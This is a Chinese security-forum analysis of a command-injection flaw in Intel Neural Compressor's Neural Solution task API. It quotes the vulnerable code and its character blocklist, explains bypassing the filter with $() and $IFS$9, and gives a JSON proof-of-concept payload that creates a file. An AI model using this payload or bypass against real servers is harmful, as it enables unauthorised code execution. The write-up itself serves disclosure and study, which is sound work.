---
title: Neural Solution 代码执行漏洞分析
url: https://forum.butian.net/share/4648
source: 奇安信攻防社区
date: 2025-11-17
fetch_date: 2025-11-18T03:13:19.637873
---

# Neural Solution 代码执行漏洞分析

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### Neural Solution 代码执行漏洞分析

* [漏洞分析](https://forum.butian.net/topic/48)

漏洞源于Intel® Neural Compressor的一个功能模块Neural Solution，前者是一个开源 Python 库，支持所有主流深度学习框架（TensorFlow、PyTorch、ONNX Runtime和 MXNet）上流行的模型压缩技术，例如量化、剪枝（稀疏性）、蒸馏和神经架构搜索。后者为前者带来了web接口服务，可以通过RESTFUL/GRPC API毫不费力地提交优化任务。

前言
--
漏洞源于Intel® Neural Compressor的一个功能模块Neural Solution，前者是一个开源 Python 库，支持所有主流深度学习框架（[TensorFlow](https://zhida.zhihu.com/search?content\_id=237698833&content\_type=Article&match\_order=1&q=TensorFlow&zd\_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDAyMTM2ODQsInEiOiJUZW5zb3JGbG93IiwiemhpZGFfc291cmNlIjoiZW50aXR5IiwiY29udGVudF9pZCI6MjM3Njk4ODMzLCJjb250ZW50X3R5cGUiOiJBcnRpY2xlIiwibWF0Y2hfb3JkZXIiOjEsInpkX3Rva2VuIjpudWxsfQ.pvHL\_5CpKfBCM1NQDcV3map4Uar-dAYdswzoxJFY8tg&zhida\_source=entity)、[PyTorch](https://zhida.zhihu.com/search?content\_id=237698833&content\_type=Article&match\_order=1&q=PyTorch&zd\_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDAyMTM2ODQsInEiOiJQeVRvcmNoIiwiemhpZGFfc291cmNlIjoiZW50aXR5IiwiY29udGVudF9pZCI6MjM3Njk4ODMzLCJjb250ZW50X3R5cGUiOiJBcnRpY2xlIiwibWF0Y2hfb3JkZXIiOjEsInpkX3Rva2VuIjpudWxsfQ.CwWhiMQR57z\_lJ0lmKyrLV0Ajx3yJDc6Um3ZYJCtiEg&zhida\_source=entity)、[ONNX Runtime](https://zhida.zhihu.com/search?content\_id=237698833&content\_type=Article&match\_order=1&q=ONNX+Runtime&zd\_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDAyMTM2ODQsInEiOiJPTk5YIFJ1bnRpbWUiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyMzc2OTg4MzMsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.ukkSxDr6tdhpP\_AirpEX8NJ3C6L9OL7Kd9\_-fk5Pbz8&zhida\_source=entity) 和 [MXNet](https://zhida.zhihu.com/search?content\_id=237698833&content\_type=Article&match\_order=1&q=MXNet&zd\_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NDAyMTM2ODQsInEiOiJNWE5ldCIsInpoaWRhX3NvdXJjZSI6ImVudGl0eSIsImNvbnRlbnRfaWQiOjIzNzY5ODgzMywiY29udGVudF90eXBlIjoiQXJ0aWNsZSIsIm1hdGNoX29yZGVyIjoxLCJ6ZF90b2tlbiI6bnVsbH0.wOxvLhm72ZqBrM\_ybyTeIjDNN2IrbukiYJQ9PKlNBW0&zhida\_source=entity)）上流行的模型压缩技术，例如量化、剪枝（稀疏性）、蒸馏和神经架构搜索。后者为前者带来了web接口服务，可以通过RESTFUL/GRPC API毫不费力地提交优化任务。
Neural Solution 功能分析
--------------------
简单来说，Neural Solution提供了api,用户可以通过submit/task接口发送任务数据，后者在服务端执行
![image-20250220164422914](https://oss-yg-cztt.yun.qianxin.com/butian-public/f990313411dc48c374895357cfaaddddd5b58523c11f0.jpg)
具体代码如下
```python
@app.post("/task/submit/")
async def submit\_task(task: Task):
if not is\_valid\_task(task.dict()):
raise HTTPException(status\_code=422, detail="Invalid task")
...
if os.path.isfile(db\_path):
conn = sqlite3.connect(db\_path)
cursor = conn.cursor()
task\_id = str(uuid.uuid4()).replace("-", "")
sql = (
r"insert into task(id, script\_url, optimized, arguments, approach, requirements, workers, status)"
+ r" values ('{}', '{}', {}, '{}', '{}', '{}', {}, 'pending')".format(
task\_id,
task.script\_url,
task.optimized,
list\_to\_string(task.arguments),
task.approach,
list\_to\_string(task.requirements),
task.workers,
)
)
cursor.execute(sql) #数据库操作，将接收到的任务参数存入数据库
conn.commit()
try:
task\_submitter.submit\_task(task\_id)
except ConnectionRefusedError:
status = "failed"
except Exception as e:
msg = "Task Submitted fail! {}".format(e)
status = "failed"
conn.close()
.....
```
程序首先通过\*is\\_valid\\_task()\*来检验请求数据的合法性，即task字典中要求的必填字段\["script\\_url", "optimized", "arguments", "approach", "requirements", "workers"\]是否存在，以及各参数是否符合数据类型的要求，例如script\\_url、optimized需要是字段串、arguments、requirements需要是列表等等。随后使用\*is\\_invalid\\_str()\*对数据内容进行检查
![image-20250307112632959](https://oss-yg-cztt.yun.qianxin.com/butian-public/f971087e5476c1a4bf6cfaa09515aa7e5c4c092bb580d.jpg)
```python
def is\_invalid\_str(to\_test\_str: str):
"""Verify whether the to\_test\_str is valid.
Args:
to\_test\_str (str): string to be tested.
Returns:
bool: valid or invalid
"""
return any(char in to\_test\_str for char in [" ", '"', "'", "&", "|", ";", "`", ">"])
#过滤空格、单双引号、管道符等
```
随后进行数据库操作，将接收到的任务参数存入数据库，通过\*prepare\\_task()\* 准备好后，最终通过\*launch\\_task()\*取出数据执行任务
通过\*subprocess.Popen()\*启动新进程将full\\_cmd作为命令执行
```python
def launch\_task(self, task: Task, resource):
"""Generate the mpi command and execute the task.
Redirect the log to ./TASK\_LOG\_PATH/task\_<id>/txt
"""
full\_cmd = self.\_parse\_cmd(task, resource)#取出task数据
log\_path = get\_task\_log\_path(log\_path=get\_task\_log\_workspace(self.config.workspace), task\_id=task.task\_id)
p = subprocess.Popen(full\_cmd, stdout=open(log\_path, "w+"), #stderr=subprocess.STDOUT, shell=True) # nosec
```
![image-20250220171710783](https://oss-yg-cztt.yun.qianxin.com/butian-public/f178241a208a4a83bc389201f1fe21d821df03334961f.jpg)
可见task\\_cmd参数直接拼接了task.arguments,随后作为bash\\_script的一部分被写入到bash\\_script\\_name中作为一个.sh文件，然后被拼接到full\\_cmd中，最终再通过\*subprocess.Popen()\*启动新进程将full\\_cmd作为命令执行。
其中script\\_name来源于任务准备过程中\*prepare\\_task()\* 的处理，判断了task.script\\_url是否为远程脚本或是本地脚本来决定script\\_name的值
![image-20250311134941869](https://oss-yg-cztt.yun.qianxin.com/butian-public/f843372c5c6fb73f25def669d9eb0c516dd47c8bc3992.jpg)
当task.script\\_url为本地脚本时
![image-20250319172359359](https://oss-yg-cztt.yun.qianxin.com/butian-public/f7250054ca1504c036381baa768a9cad8c370e3f68c87.jpg)
由于upload\\_path为用户自己配置的路径，而其路径下的本地脚本文件路径（即task.script\\_url）未知，将在
script\\_path赋值时出现索引异常中断执行
![image-20250319172526624](https://oss-yg-cztt.yun.qianxin.com/butian-public/f8584637323ce9b10ab704d5cb8d466795532b2b3cbde.jpg)
![image-20250319172655803](https://oss-yg-cztt.yun.qianxin.com/butian-public/f7875975a076d917ee8fbeb8c99da9f4acee51a05861b.jpg)
![image-20250319172559602](https://oss-yg-cztt.yun.qianxin.com/butian-public/f475641797f12d56405cca522a82bf7cc0fd46ac08a89.jpg)
而当task.optimized为false且脚本为远程url时，script\\_name很清晰就为url中最后一个斜杠后的值
![image-20250319172745121](https://oss-yg-cztt.yun.qianxin.com/butian-public/f19140501bec4bfefcec4198887dc8cb0e986845ea93b.jpg)
漏洞分析
----
分析完组件功能，可以只要构造恶意代码到task.arguments参数中，绕过\*is\\_valid\\_task()\*中\*is\\_invalid\\_str()\*
的安全检查，即可任意代码执行（无回显）。
首先看看，拼接后的full\\_cmd大致组成如下
```php
cd $task\\_path
$mpi\\_cmd bash xxxx.sh
xxx.sh内容为：
xxxx
cd xxxx
python xxxxx.py(task.script\\_name) task.arguments
```
由于是使用bash 来运行sh文件，而不是直接调用文件本身，所以sh文件本身不需要对其赋予执行权限就可以执行它
可控参数拼接在python命令后，再来看看task.arguments的构成
在README.MD中，了解到任务的数据结构以及参数大致如下
![image-20250220174407749](https://oss-yg-cztt.yun.qianxin.com/butian-public/f490473ce6bb25eb38166cca019379949c0b95612ddf5.jpg)
也就是说，最终可控参数拼接在如下位置
python xxx.py --dataset\\_location=可控 --model\\_path=可控
由于反引号已被过滤，可以使用$()将恶意命令拼接到其中，如下案例，py文件即使不存在也不影响命令执行
python aaa.py --aaa=$(touch test/aaa)
![image-20250305112426168](https://oss-yg-cztt.yun.qianxin.com/butian-public/f359973dcbf0dba4518fb59a2ac3e09e46a93b3ab6b8f.jpg)
由于此处需要对空格的过滤进行绕过
在linux中代替空格有如下几种方案
$IFS$9、${IFS}、$IFS、&lt; 、&lt;&gt;、%20(space)、%09(tab)、
则可以改为
python aaa.py --aaa=$(touch$IFS$9test/aaa)
漏洞复现
----
由于此处是无回显的，可以使用touch创建一个文件来验证，构造payload如下
```php
{
"script\_url": "https://raw.githubusercontent.com/sunriseXu/onnx/main/main.py",
"optimized": "False",
"arguments": [
"--dataset\_location=$(touch$IFS$9/tmp/test)", "--model\_path=$(touch$IFS$9/tmp/test)"
],
"approach": "static",
"requirements": [
],
"workers": 1
}
```
![image-20250221110200107](https://oss-yg-cztt.yun.qianxin.com/butian-public/f9907...